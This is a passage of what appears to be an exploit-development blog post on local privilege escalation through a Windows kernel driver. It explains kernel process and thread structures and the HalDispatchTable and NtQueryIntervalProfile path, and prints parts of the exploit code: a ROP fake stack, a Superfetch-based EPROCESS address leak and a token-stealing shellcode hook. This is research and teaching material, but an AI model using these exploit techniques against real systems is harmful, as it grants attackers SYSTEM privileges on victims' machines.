	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// Restore RBX</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x201380</span><span class="p">;</span>		<span class="c1">// pop rsp ; ret</span>
	<span class="k">return</span> <span class="n">fake_stack</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The full exploit code can be found in my GitHub repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/tree/main">forti_shield</a></p>

<p>A quick side quest is necessary to discuss some important structures used by the Windows kernel. Processes are a management and control construct used by windows to control resources and scheduling of code execution. Process do not execute code themselves. Processes contain thread, and sometimes fibers, that execute the code. Running process have an EPROCESS, KPROCESS, ETHREAD, and KTHREAD structure.</p>

<p>The EPROCESS structure is the virtual representation of the process in the Executive’s portion of the Windows kernel. This structure contains all of the information required by the kernel to schedule the processes threads for execution and contains references to the processes resources. It ties together the thread, memory management, and security information of the process. It contains the ActiveProcessLinks which is a doubly linked list chaining all running processes together. This is an important piece to remember as part of our Privilege Escalation is walking the ActiveProcessLinks to find the SYSTEM process, Process Identifier (PID) 4. The other important piece to remember for Privilege Escalation is that the EPROCESS also contains the Security Token. The Security Token is the identifier that ties the process to the privileges it has. So if we copy the SYSTEM process token to our current processes Security Token in it’s EPROCESS structure then our process will have the same privileges as the SYSTEM process. the integrity levels, or trust/permissions levels, for a process are low (low privileged/sandboxed user), medium (normal user), high (administrator), and SYSTEM (Full Control). The EPROCESS also conatins a pointer to the Process Environment Block (PEB) which contians the environment information for the process that is accessible via user-mode.
![[/assets/images/post2-windbg-eprocess.png]]</p>

<p>The KPROCESS structure is embedded in the EPROCESS structure. This structure is the virtual representation of the process object for the kernel. It holds the lower level  details and management of the process including scheduling, dispatcher info, ready queues, affinity, and priority for the process. It is basically all of the scheduling information for the process to schedule the threads for execution.
![[post2-windbg-kprocess.png]]</p>

<p>The ETHREAD represents the thread for the process for the Executive portion of the Windows Kernel. This will contain thread specific resource information. It has a link back to the owning EPROCESS and has the KTHREAD embedded making it possible to walk back to the EPROCESS if you have the KTHREAD address. It also contains a pointer to the Thread Environment Block (TEB) that contains the thread’s environment information that is accessible from user-mode. In user-mode if you needed to find the stack limit and stack base for the thread you would pull it from the TEB.
![[post2-windbg-ethread.png]]</p>

<p>The KTHREAD is embedded in the ETHREAD. This is the representation of the thread for the process in the kernel portion of the Windows Kernel. It holds stack information, dispatcher state, wait blocks, and CPU registers to restore when the thread resumes execution. It is important to remember that while to our perception threads run continuously, that is not the case in reality.  The threads are actually only allowed to run for very brief intervals on the CPU and then go to a wait state until it’s their turn to run again. Thus the CPU register values need to be stored somewhere to restore the state and continue execution. The KTHREAD is also where we can find the Previous Mode bit.  It used to be possible to create a read/write primitive by clearing the Previous Mode bit. Windows would check this bit to determine if parameters passed to the Windows 32 APIs or functions where sent from kernel-mode or user-mode. So if it was cleared to zero you could call ReadProcessMemory and NtWriteVirtualMemory to read or write kernel-mode memory from user-mode as the kernel would think that it came from a kernel-mode call instead of a user-mode call. This method is no longer possible, but is the method used in this example.
![[post2-windbg-kthread.png]]</p>

<p>I started solving the kernel code execution piece by looking at examples of how other people have used the HalDispatchTable method (and also ensuring HCVI and VBS were disabled on the VM). Connor McGarr wrote a nice blog on exploiting Hacksys Extreme Vulnerable Driver (HEVD) in 32-bit where he used it to call his shellcode stored in a user-mode memory location. If you can understand 32-bit then you can typically easily pivot to 64-bit <a href="https://connormcgarr.github.io/Kernel-Exploitation-2">Kernel-Exploitation-2 Connor McGarr</a></p>

<p>I will do the quick dive through the 64-bit version here.</p>

<p>If we open up ntoskrnl.exe in IDA and search for HalDisptachTable we will find one hit.</p>

<p>![[post2-ida-haldispatch-table1.png]]
 Double click on it to see the table and look for HalDispatchTable+0x08
 ![[post2-ida-haldispatch-table2.png]]
 Here it is labeled as xHalSetSystemInformation, which is weird because we know at run time it is set to nt!HaliQuerySystemInformation. We can verify this in WinDbg with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> dqs nt!HalDispatchTable
</code></pre></div></div>
<p>![[post2-windbg-haldispatchtable-1.png]]</p>

<p>Our goal is to figure out how to reach this entry in the dispatch table. If we cross reference the label off__140C00A68 in IDA by highlighting it and hiting ctrl+J or right clicking and selecting ‘list cross references to’ we will see KeQueryIntervalProfile in the list. Ke and Ki designate functions as kernel functions in Microsoft nameology. We will investigate this function as it looks interesting being a kernel function. If this was brand new to us and we were trying to find the unknown path we would likely have to investigate many of the options until we find something that works.
![[post2-ida-kequeryintervalprofile-1.png]]
When we double click the entry for KeQueryIntervalProfile we will jump to the function in IDA. It’s important to note here that we see a call to guard_dispatch_icall which is a Kernel Control Flow Guard  (KCFG) function.
![[post2-ida-kequeryintervalprofile-2.png]]
Now if we right click KeQueryIntervalProfile at the top of the graph and select “List cross reference to…” or hit ctrl+X we can see a reference in NtQueryIntervalProfile.
![[post2-ida-kequeryintervalprofile-3.png]]
As we double click and enter the NtQueryIntervalProfile function we see in the function’s prologue a “mov rax, gs:188h” followed by “mov dil, [rax+232h]” and “test dil, dil”. This loads the KTHREAD of the calling thread in to rax and then extracts the Previous Mode and checks to see if it is 0 or kernel-mode. This indicates that this function is most likely called via a syscall. 
![[post2-windbg-previousmode-1.png]]
![[post2-windbg-previousmode-2.png]]</p>

<p>We will now jump over to ntdll.dll for further analysis. When we open up ntdll.dll in IDA and check the exports we find an NtQueryIntervalProfile function within ntdll as well.
![[post2-ida-ntqueryintervalprofile-2.png]]
When we double click on the function to jump to the disassembly graph we see a short function that makes a 0x151 syscall.
![[post2-ida-ntqueryintervalprofile-3.png]]
We can then switch back to WinDbg and verify that syscall 0x151 calls to nt!NtQueryIntervalProfile. We consult the KiServiceTable which is a table of offsets in to ntoskrnl and the syscall number is the index in to the KiServiceTable to find the offset of the desired function. We then take the value found and the index and right shift it 4 bits. We then add that to nt!KiServiceTable and disassemble at that address. We use the following commands to verify the syscall:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dd nt!KiServiceTable + 0x04 * 0x151 L1

? 064FCD00 &gt;&gt;&gt; 4

u nt!KiServiceTable + 00000000`0064fcd0
</code></pre></div></div>
<p>![[post2-windbg-syscall-1.png]]
We can call this function from user-mode since it is exported from ntdll.dll. This is an undocumented API and Microsoft does not intended for us to directly call it. Luckily other researchers have performed the RE necessary to determine the function prototype so that we know how to call it. <a href="https://ntdoc.m417z.com/ntqueryintervalprofile">NtDoc</a> lists the prototype as:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef _NTEXAPI_H
#if (PHNT_MODE != PHNT_MODE_KERNEL)
</span>
<span class="cm">/**
 * The NtQueryIntervalProfile routine retrieves the interval for the specified profile source.
 *
 * \param ProfileSource The profile source (KPROFILE_SOURCE) to query.
 * \param Interval A pointer to a variable that receives the interval, in 100-nanosecond units.
 * \return NTSTATUS Successful or errant status.
 */</span>
<span class="n">NTSYSCALLAPI</span>
<span class="n">NTSTATUS</span>
<span class="n">NTAPI</span>
<span class="nf">NtQueryIntervalProfile</span><span class="p">(</span>
    <span class="n">_In_</span> <span class="n">KPROFILE_SOURCE</span> <span class="n">ProfileSource</span><span class="p">,</span>
    <span class="n">_Out_</span> <span class="n">PULONG</span> <span class="n">Interval</span>
    <span class="p">);</span>

<span class="cp">#endif
#endif
</span></code></pre></div></div>

<p>Connor McGarr was able to use 0x1234 for ProfileSource in his blog. I did not have any luck getting that to work in my testing. I used the value 0x2 that corresponds to ProfileTotalIssues. I picked this value based off a recommendation from Microsoft CoPilot when troubleshooting errors as it said it was the most commonly used value. My testing showed that the values 0x2 worked. AI can help you if used properly, but you cannot be successful in the security research or exploit development fields if you over rely on AI. The Interval parameter can simply be a pointer to a declared ULONG variable. Below is the enum of the KPROFILE_SOURCE from <a href="https://ntdoc.m417z.com/kprofile_source">NtDoc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef _NTKEAPI_H
#if (PHNT_MODE != PHNT_MODE_KERNEL)
</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_KPROFILE_SOURCE</span>
<span class="p">{</span>
    <span class="n">ProfileTime</span><span class="p">,</span>
    <span class="n">ProfileAlignmentFixup</span><span class="p">,</span>
    <span class="n">ProfileTotalIssues</span><span class="p">,</span>
    <span class="n">ProfilePipelineDry</span><span class="p">,</span>
    <span class="n">ProfileLoadInstructions</span><span class="p">,</span>
    <span class="n">ProfilePipelineFrozen</span><span class="p">,</span>
    <span class="n">ProfileBranchInstructions</span><span class="p">,</span>
    <span class="n">ProfileTotalNonissues</span><span class="p">,</span>
    <span class="n">ProfileDcacheMisses</span><span class="p">,</span>
    <span class="n">ProfileIcacheMisses</span><span class="p">,</span>
    <span class="n">ProfileCacheMisses</span><span class="p">,</span>
    <span class="n">ProfileBranchMispredictions</span><span class="p">,</span>
    <span class="n">ProfileStoreInstructions</span><span class="p">,</span>
    <span class="n">ProfileFpInstructions</span><span class="p">,</span>
    <span class="n">ProfileIntegerInstructions</span><span class="p">,</span>
    <span class="n">Profile2Issue</span><span class="p">,</span>
    <span class="n">Profile3Issue</span><span class="p">,</span>
    <span class="n">Profile4Issue</span><span class="p">,</span>
    <span class="n">ProfileSpecialInstructions</span><span class="p">,</span>
    <span class="n">ProfileTotalCycles</span><span class="p">,</span>
    <span class="n">ProfileIcacheIssues</span><span class="p">,</span>
    <span class="n">ProfileDcacheAccesses</span><span class="p">,</span>
    <span class="n">ProfileMemoryBarrierCycles</span><span class="p">,</span>
    <span class="n">ProfileLoadLinkedIssues</span><span class="p">,</span>
    <span class="n">ProfileMaximum</span>
<span class="p">}</span> <span class="n">KPROFILE_SOURCE</span><span class="p">;</span>

<span class="cp">#endif
#endif
</span></code></pre></div></div>

<p>We now have enough to start putting together a full chain exploit using the HalDispatchTable for kernel-mode code execution. The code for the executable that will result in a bugcheck is in the GitHub repo as <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/bugcheck.cpp">bugcheck.cpp</a> and listed below in chunks with explanations. You will still need the solution from the repo that includes the headers and libraries needed to compile.</p>

<p>This first chunk just includes the headers, defines some constants, imports the token stealing shellcode from token_stealing.asm to TokenStealing(). The constants are for values in the EPROCESS and ETHREAD structures to find the KTHREAD from the EPROCESS. These are hardcoded so they are not guaranteed to work on other versions of Windows since they can change. It has been tested to work on Windows 10 20H1 and 20H2. We also define the prototpye for NtQueryIntervalProfile at the end of this chunk.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"stdafx.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"ntos.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Shlobj.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment (lib,"psapi")
#pragma comment(lib, "ntdll_x64.lib")
#define EPROCESS_ThreadListHead_Offset 0x5e0
#define ETHREAD_ThreadListEntry_Offset 0x4e8
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x478
#define CLIENTID_UniqueThread_Offset   0x8
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="kt">void</span> <span class="nf">TokenStealing</span><span class="p">();</span>

<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SUPERFETCH_INFORMATION_CLASS</span>
<span class="p">{</span>
	<span class="n">SuperfetchRetrieveTrace</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
	<span class="n">SuperfetchSystemParameters</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
	<span class="n">SuperfetchLogEvent</span> <span class="o">=</span> <span class="mh">0x3</span><span class="p">,</span>
	<span class="n">SuperfetchGenerateTrace</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span>
	<span class="n">SuperfetchPrefetch</span> <span class="o">=</span> <span class="mh">0x5</span><span class="p">,</span>
	<span class="n">SuperfetchPfnQuery</span> <span class="o">=</span> <span class="mh">0x6</span><span class="p">,</span>
	<span class="n">SuperfetchPfnSetPriority</span> <span class="o">=</span> <span class="mh">0x7</span><span class="p">,</span>
	<span class="n">SuperfetchPrivSourceQuery</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">,</span>
	<span class="n">SuperfetchSequenceNumberQuery</span> <span class="o">=</span> <span class="mh">0x9</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioPhase</span> <span class="o">=</span> <span class="mh">0xA</span><span class="p">,</span>
	<span class="n">SuperfetchWorkerPriority</span> <span class="o">=</span> <span class="mh">0xB</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioQuery</span> <span class="o">=</span> <span class="mh">0xC</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioPrefetch</span> <span class="o">=</span> <span class="mh">0xD</span><span class="p">,</span>
	<span class="n">SuperfetchRobustnessControl</span> <span class="o">=</span> <span class="mh">0xE</span><span class="p">,</span>
	<span class="n">SuperfetchTimeControl</span> <span class="o">=</span> <span class="mh">0xF</span><span class="p">,</span>
	<span class="n">SuperfetchMemoryListQuery</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
	<span class="n">SuperfetchMemoryRangesQuery</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">,</span>
	<span class="n">SuperfetchTracingControl</span> <span class="o">=</span> <span class="mh">0x12</span><span class="p">,</span>
	<span class="n">SuperfetchTrimWhileAgingControl</span> <span class="o">=</span> <span class="mh">0x13</span><span class="p">,</span>
	<span class="n">SuperfetchInformationMax</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">,</span>
<span class="p">}</span> <span class="n">SUPERFETCH_INFORMATION_CLASS</span><span class="p">;</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtWriteVirtualMemory</span><span class="p">)(</span>
	<span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">ULONG</span> <span class="n">NumberOfBytesToWrite</span><span class="p">,</span>
	<span class="n">_Out_opt_</span> <span class="n">PULONG</span> <span class="n">NumberOfBytesWritten</span>
	<span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SUPERFETCH_INFORMATION</span>
<span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Magic</span><span class="p">;</span>
	<span class="n">SUPERFETCH_INFORMATION_CLASS</span> <span class="n">InfoClass</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">Data</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
<span class="p">}</span> <span class="n">SUPERFETCH_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSUPERFETCH_INFORMATION</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_PFS_PRIVATE_PAGE_SOURCE_TYPE</span> <span class="p">{</span>
	<span class="n">PfsPrivateSourceKernel</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
	<span class="n">PfsPrivateSourceSession</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
	<span class="n">PfsPrivateSourceProcess</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
	<span class="n">PrfsPrivateSourceMax</span> <span class="o">=</span> <span class="mh">0x3</span><span class="p">,</span>
<span class="p">}</span> <span class="n">PFS_PRIVATE_PAGE_SOURCE_TYPE</span><span class="p">;</span>

<span class="cp">#pragma pack(push)
#pragma pack(4)
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PFS_PRIVATE_PAGE_SOURCE</span>
<span class="p">{</span>
	<span class="n">PFS_PRIVATE_PAGE_SOURCE_TYPE</span> <span class="n">Type</span><span class="p">;</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">DWORD</span> <span class="n">SessionId</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="n">ProcessId</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">DWORD</span> <span class="n">SpareDwords</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="n">ULONG</span> <span class="n">ImagePathHash</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">UniqueProcessHash</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PFS_PRIVATE_PAGE_SOURCE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPFS_PRIVATE_PAGE_SOURCE</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_INFO_V3</span> <span class="p">{</span>
	<span class="n">PFS_PRIVATE_PAGE_SOURCE</span> <span class="n">DbInfo</span><span class="p">;</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">ULONG_PTR</span> <span class="n">EProcess</span><span class="p">;</span>
		<span class="n">ULONG_PTR</span> <span class="n">GlobalVA</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">ULONG</span> <span class="n">WsPrivatePages</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">TotalPrivatePages</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">SessionID</span><span class="p">;</span>
	<span class="n">CHAR</span> <span class="n">ImageName</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
	<span class="n">BYTE</span> <span class="n">SpareBytes</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_INFO_V3</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_INFO_V3</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_INFO_V3PLUS</span> <span class="p">{</span>
	<span class="n">BYTE</span> <span class="n">data2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="n">DWORD</span> <span class="n">ProcessId</span><span class="p">;</span>
	<span class="n">BYTE</span> <span class="n">data3</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
	<span class="n">ULONG_PTR</span> <span class="n">EProcess</span><span class="p">;</span>
	<span class="n">BYTE</span> <span class="n">data</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_INFO_V3PLUS</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_INFO_V3PLUS</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_QUERY_REQUEST</span> <span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>

	<span class="k">union</span> <span class="p">{</span>
		<span class="kr">__declspec</span><span class="p">(</span><span class="n">align</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="k">struct</span> <span class="p">{</span>
			<span class="n">ULONG</span> <span class="n">InfoCount</span><span class="p">;</span>
			<span class="n">PF_PRIVSOURCE_INFO_V3</span> <span class="n">InfoArrayV3</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="p">}</span> <span class="n">__sv3</span><span class="p">;</span>
		<span class="kr">__declspec</span><span class="p">(</span><span class="n">align</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="k">struct</span> <span class="p">{</span>
			<span class="n">ULONG</span> <span class="n">Type</span><span class="p">;</span>
			<span class="n">ULONG</span> <span class="n">InfoCount</span><span class="p">;</span>
			<span class="n">PF_PRIVSOURCE_INFO_V3PLUS</span> <span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="p">}</span> <span class="n">__sv3plus</span><span class="p">;</span>
	<span class="p">}</span> <span class="n">__u0</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_QUERY_REQUEST</span><span class="p">;</span>

<span class="cp">#pragma pack(pop)
</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span>
	<span class="n">DWORD</span> <span class="n">junk</span><span class="p">,</span>
	<span class="n">PULONG</span> <span class="n">buffer</span>
	<span class="p">);</span>
</code></pre></div></div>

<p>This chunk defines the GetEprocessAddress() from freeide’s code for CVE-2021-31955 with my modifications mentioned earlier.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">GetEprocessAddress</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">superfetch_info_size</span><span class="p">;</span>
	<span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="o">*</span> <span class="n">pf_privsource_query_request</span><span class="p">;</span>
	<span class="n">SUPERFETCH_INFORMATION</span> <span class="n">superfetch_info</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="n">BYTE</span> <span class="n">temp_buffer</span><span class="p">[</span><span class="mh">0x70</span><span class="p">];</span>

	<span class="n">ZeroMemory</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">));</span>

	<span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">NtCurrentTeb</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">dwBuildNumber</span> <span class="o">=</span> <span class="n">peb</span><span class="o">-&gt;</span><span class="n">OSBuildNumber</span><span class="p">;</span>

	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span> <span class="c1">// Windows 10</span>

	<span class="k">switch</span> <span class="p">(</span><span class="n">dwBuildNumber</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="mi">7600</span><span class="p">:</span>
	<span class="k">case</span> <span class="mi">7601</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mi">9200</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mi">9600</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">temp_buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">InfoClass</span> <span class="o">=</span> <span class="n">SuperfetchPrivSourceQuery</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Version</span> <span class="o">=</span> <span class="mi">45</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Magic</span> <span class="o">=</span> <span class="err">'</span><span class="n">kuhC</span><span class="err">'</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Data</span> <span class="o">=</span> <span class="n">temp_buffer</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">);</span>

	<span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">pf_privsource_query_request_version</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span><span class="p">;</span>

	<span class="n">status</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemSuperfetchInformation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">superfetch_info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SUPERFETCH_INFORMATION</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="n">pf_privsource_query_request</span> <span class="o">=</span> <span class="p">(</span><span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="o">*</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">__u0</span><span class="p">.</span><span class="n">__sv3</span><span class="p">.</span><span class="n">InfoCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">Version</span> <span class="o">=</span> <span class="n">pf_privsource_query_request_version</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Data</span> <span class="o">=</span> <span class="n">pf_privsource_query_request</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">superfetch_info_size</span><span class="p">;</span>

	<span class="n">status</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemSuperfetchInformation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">superfetch_info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SUPERFETCH_INFORMATION</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="k">auto</span> <span class="n">sv3plus_request</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">__u0</span><span class="p">.</span><span class="n">__sv3plus</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">targetName</span> <span class="o">=</span> <span class="n">target</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">procName</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">procName</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">[</span><span class="mh">0x14</span><span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">targetName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="c1">//printf("%15s\t%5d\t%p\n", procName, sv3plus_request-&gt;InfoArrayV3Plus[i].ProcessId, sv3plus_request-&gt;InfoArrayV3Plus[i].EProcess);</span>
			<span class="k">return</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">EProcess</span><span class="p">;</span>
		<span class="p">}</span>


	<span class="p">}</span>

